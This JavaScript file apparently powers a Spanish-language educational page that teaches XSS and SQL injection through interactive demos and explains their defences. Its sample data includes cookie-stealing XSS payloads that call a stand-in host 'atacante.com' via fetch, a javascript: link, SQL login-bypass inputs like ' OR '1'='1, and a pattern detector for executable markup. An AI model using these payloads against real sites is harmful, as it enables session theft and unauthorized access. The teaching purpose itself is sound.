(function () {
  'use strict';
  const { color: C, el } = VIZ;
  const { esc } = VIZ.web;

  /* ---------- Fig. 1: XSS almacenado en un comentario ---------- */

  const CARGAS = {
    normal: { t: 'comentario normal', v: '¡Muy buen artículo!' },
    script: { t: 'etiqueta <script>', v: '<script>fetch("https://atacante.com/?c=" + document.cookie)</script>' },
    img: { t: 'atributo de evento (onerror)', v: '<img src="x" onerror="fetch(\'https://atacante.com/?c=\' + document.cookie)">' },
    enlace: { t: 'enlace javascript:', v: '<a href="javascript:alert(document.cookie)">pulse aquí</a>' },
    negrita: { t: 'HTML inofensivo (negrita)', v: 'Esto es <b>importante</b>' },
  };
  const DEFENSAS = {
    ninguna: { t: 'sin defensa: innerHTML con el texto tal cual', f: (s) => s },
    escapar: { t: 'escapar la salida (textContent)', f: (s) => esc(s) },
    lista: { t: 'sanitizar con lista blanca (solo b, i, em)', f: (s) => s.replace(/<(?!\/?(b|i|em)\b)[^>]*>/gi, '').replace(/<(b|i|em)\b[^>]*>/gi, '<$1>') },
  };

  // Analiza el HTML en un documento inerte (sin ejecutar nada) y busca lo que el navegador ejecutaría.
  function peligros(html) {
    const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html'), res = [];
    doc.querySelectorAll('script').forEach(() => res.push('un elemento <script>'));
    doc.body.querySelectorAll('*').forEach((n) => [...n.attributes].forEach((a) => {
      if (/^on/i.test(a.name)) res.push(`el atributo ${a.name}`);
      if (/^(href|src)$/i.test(a.name) && /^\s*javascript:/i.test(a.value)) res.push(`una URL javascript: en ${a.name}`);
    }));
    return res;
  }

  function montarXss(cuerpo) {
    const est = { carga: 'script', defensa: 'ninguna', csp: false };
    const ctl = VIZ.controles(cuerpo);
    ctl.selector({ etiqueta: 'Comentario enviado por un atacante', valor: est.carga, opciones: Object.entries(CARGAS).map(([k, c]) => [k, c.t]), alCambiar: (v) => { est.carga = v; dibujar(); } });
    ctl.selector({ etiqueta: 'Defensa de la página', valor: est.defensa, opciones: Object.entries(DEFENSAS).map(([k, d]) => [k, d.t]), alCambiar: (v) => { est.defensa = v; dibujar(); } });
    ctl.casilla({ etiqueta: 'cabecera Content-Security-Policy (bloquea scripts en línea)', valor: false, alCambiar: (v) => { est.csp = v; dibujar(); } });
    const dos = el('div', { class: 'dos-columnas' });
    const guardado = el('pre', { class: 'codigo-bdd' }), generado = el('pre', { class: 'codigo-bdd' });
    dos.append(el('div', null, el('p', { class: 'subtitulo-viz' }, 'Lo que guarda la base de datos'), guardado), el('div', null, el('p', { class: 'subtitulo-viz' }, 'HTML que recibe el navegador del lector'), generado));
    const veredicto = el('div', { class: 'fichas' });
    cuerpo.append(dos, veredicto);
    const registro = VIZ.registro(cuerpo);
    const lectura = VIZ.lectura(cuerpo);
    VIZ.nota(cuerpo, 'Cada lector que abra la página recibe el comentario como parte de ella. Si el navegador lo interpreta como código, se ejecuta <em>con los permisos del sitio</em> (puede leer sus cookies y actuar en nombre del usuario).');
    cuerpo.dataset.sinLeyenda = 'figura sin canvas';
    function dibujar() {
      const entrada = CARGAS[est.carga].v, salida = DEFENSAS[est.defensa].f(entrada);
      const p = peligros(salida);
      const bloqueado = p.length > 0 && est.csp;
      guardado.textContent = entrada;
      generado.textContent = `<p class="comentario">${salida}</p>`;
      const mal = p.length > 0 && !est.csp;
      veredicto.replaceChildren(el('span', { class: 'fichas-titulo' }, 'Resultado en el navegador del lector:'),
        VIZ.ficha(mal ? 'SE EJECUTA código del atacante' : bloqueado ? 'bloqueado por la política CSP' : 'se muestra como texto o HTML inofensivo', { color: mal ? C.s8 : C.s6, fondo: VIZ.alfa(mal ? C.s8 : C.s6, 0.2) }));
      registro.textContent = mal ? `El navegador encontró ${p.join(', ')}: ejecutará ese código y podría enviar la cookie de sesión del lector al atacante.` : bloqueado ? `Había ${p.join(', ')}, pero la CSP impide ejecutar scripts en línea: es una segunda línea de defensa.` : est.defensa === 'escapar' ? 'Al escapar < y >, el texto se ve literalmente, sin que el navegador lo interprete como etiqueta.' : 'No hay nada ejecutable en lo que se envía al navegador.';
      lectura.set([['elementos peligrosos', String(p.length)], ['defensa', est.defensa === 'ninguna' ? 'ninguna' : est.defensa === 'escapar' ? 'escape de salida' : 'lista blanca'], ['CSP', est.csp ? 'activa' : 'no']]);
    }
    dibujar();
  }

  /* ---------- Fig. 2: inyección SQL ---------- */

  const ENTRADAS = {
    normal: { t: 'usuario «ana», clave «1234»', u: 'ana', c: '1234' },
    tautologia: { t: "usuario «x» y clave «' OR '1'='1»", u: 'x', c: "' OR '1'='1" },
    comentario: { t: "usuario «admin'--», cualquier clave", u: "admin'--", c: 'lo-que-sea' },
  };
  const USUARIOS = [{ u: 'ana', c: '1234' }, { u: 'admin', c: 's3cr3to' }, { u: 'beto', c: 'abcd' }];

  function montarSql(cuerpo) {
    const est = { entrada: 'tautologia', modo: 'concat' };
    const ctl = VIZ.controles(cuerpo);
    ctl.selector({ etiqueta: 'Lo que escribe el usuario', valor: est.entrada, opciones: Object.entries(ENTRADAS).map(([k, e]) => [k, e.t]), alCambiar: (v) => { est.entrada = v; dibujar(); } });
    ctl.selector({ etiqueta: 'Cómo arma la consulta el servidor', valor: est.modo, opciones: [['concat', 'concatenando texto'], ['param', 'consulta parametrizada']], alCambiar: (v) => { est.modo = v; dibujar(); } });
    const codigo = el('pre', { class: 'codigo-bdd' }), sql = el('pre', { class: 'codigo-bdd' }), tabla = el('table', { class: 'tabla-datos texto' });
    cuerpo.append(codigo, el('p', { class: 'subtitulo-viz' }, 'Consulta que ejecuta la base de datos'), sql, el('div', { class: 'caja-desplazable' }, tabla));
    const registro = VIZ.registro(cuerpo);
    const lectura = VIZ.lectura(cuerpo);
    VIZ.nota(cuerpo, 'Con concatenación, lo que escribe el usuario <em>se vuelve parte del código SQL</em>. Con parámetros, siempre se trata como un dato.');
    cuerpo.dataset.sinLeyenda = 'figura sin canvas';
    function dibujar() {
      const { u, c } = ENTRADAS[est.entrada];
      let filas;
      if (est.modo === 'concat') {
        codigo.textContent = '"SELECT * FROM usuarios WHERE usuario = \'" + u + "\' AND clave = \'" + c + "\'"';
        sql.textContent = `SELECT * FROM usuarios WHERE usuario = '${u}' AND clave = '${c}'`;
        if (/'\s*or\s*'?1'?\s*=\s*'?1/i.test(c) || /'\s*or\s*'?1'?\s*=\s*'?1/i.test(u)) filas = USUARIOS;
        else if (/'\s*--/.test(u)) filas = USUARIOS.filter((x) => x.u === u.split("'")[0]);
        else filas = USUARIOS.filter((x) => x.u === u && x.c === c);
      } else {
        codigo.textContent = 'db.query("SELECT * FROM usuarios WHERE usuario = ? AND clave = ?", [u, c])';
        sql.textContent = `SELECT * FROM usuarios WHERE usuario = ? AND clave = ?\n-- parámetros: ["${u}", "${c}"]  (se envían aparte, nunca como código)`;
        filas = USUARIOS.filter((x) => x.u === u && x.c === c);
      }
      tabla.replaceChildren(el('tr', null, el('th', null, 'usuario'), el('th', null, 'clave')), ...(filas.length ? filas.map((f) => el('tr', null, el('td', null, f.u), el('td', null, f.c))) : [el('tr', null, el('td', { class: 'vacia' }, 'sin filas'), el('td', { class: 'vacia' }, ''))]));
      const ataque = est.entrada !== 'normal', ok = filas.length > 0;
      registro.textContent = est.modo === 'param' ? (ataque ? 'La entrada maliciosa se busca como un usuario literal: no coincide con nadie. El ataque no tiene efecto.' : 'Una consulta normal funciona igual con parámetros.') : ataque && ok ? `La entrada alteró la lógica de la consulta: devuelve ${filas.length} fila(s) y el atacante inicia sesión sin conocer la clave.` : ok ? 'Inicio de sesión legítimo.' : 'Credenciales incorrectas.';
      lectura.set([['filas devueltas', String(filas.length)], ['inicia sesión', ok ? 'sí' : 'no'], ['¿fue un ataque exitoso?', ataque && ok ? 'SÍ' : 'no']]);
    }
    dibujar();
  }

  VIZ.registrarTema('xss-injection', {
    intro: String.raw`
      <p>Casi todos los ataques de inyección tienen la misma raíz: el programa mezcla <strong>datos</strong> con <strong>código</strong> y un atacante logra que sus datos se interpreten como instrucciones.
      En <strong>XSS</strong> (<em>Cross-Site Scripting</em>) el código es JavaScript que se ejecuta en el navegador de otra persona; en la <strong>inyección SQL</strong>, comandos que ejecuta la base de datos.</p>
      <p>La defensa también es común: tratar siempre lo que viene del usuario como dato, nunca como código, usando el mecanismo adecuado a cada contexto.</p>`,
    visualizaciones: [
      { titulo: 'XSS en un comentario', descripcion: 'Envíe distintas cargas y active defensas: escape de salida, lista blanca y política CSP. El análisis busca lo que el navegador ejecutaría.', montar: montarXss },
      { titulo: 'Inyección SQL en un login', descripcion: 'Pruebe una entrada normal y dos maliciosas, con consulta concatenada y con parámetros.', montar: montarSql },
    ],
    teoria: String.raw`
      <h2>Tipos de XSS</h2>
      <table>
        <tr><th>Tipo</th><th>Dónde está el código del atacante</th></tr>
        <tr><td>Almacenado</td><td>guardado en la base de datos (un comentario) y servido a todos</td></tr>
        <tr><td>Reflejado</td><td>en la URL o formulario; el servidor lo devuelve en la respuesta</td></tr>
        <tr><td>Basado en DOM</td><td>el JavaScript de la página lo inserta con <code>innerHTML</code></td></tr>
      </table>
      <p>Impacto: robar cookies o tokens que JavaScript pueda leer, actuar en nombre del usuario, redirigir a páginas falsas.</p>
      <h2>Defensas</h2>
      <ul>
        <li><strong>Escapar la salida</strong> según el contexto: en HTML, <code>&lt;</code> → <code>&amp;lt;</code>. Use <code>textContent</code> (no <code>innerHTML</code>); los frameworks como React escapan por omisión.</li>
        <li><strong>Sanitizar</strong> con una lista blanca si se permite HTML (bibliotecas especializadas, no expresiones regulares).</li>
        <li><strong>Content-Security-Policy</strong>: prohíbe scripts en línea y orígenes no autorizados.</li>
        <li>Cookies <code>HttpOnly</code>: aunque haya XSS, JavaScript no puede leer la cookie de sesión.</li>
      </ul>
      <h2>Inyección SQL</h2>
      <pre><code>-- concatenado, con la clave:  ' OR '1'='1
SELECT * FROM usuarios WHERE usuario = 'x' AND clave = '' OR '1'='1'
-- la condición AND ... OR 1=1 es siempre verdadera: devuelve todas las filas</code></pre>
      <p>La solución definitiva son las <strong>consultas parametrizadas</strong>: la base de datos recibe la estructura de la consulta y los valores por separado, por lo que un valor nunca puede cambiar la estructura. Un ORM como <a href="tema.html?id=sequelize-associations">Sequelize</a> las usa por omisión, salvo que se escriba SQL «a mano» concatenando.</p>
      <div class="recuadro">Regla de oro: <strong>validar la entrada y escapar la salida</strong>, y no confiar en nada que venga del cliente. Otras amenazas de la misma familia: <a href="tema.html?id=csrf-attack">CSRF</a> y el robo de credenciales (<a href="tema.html?id=password-hashing">hashing de contraseñas</a>).</div>`,
  });
})();
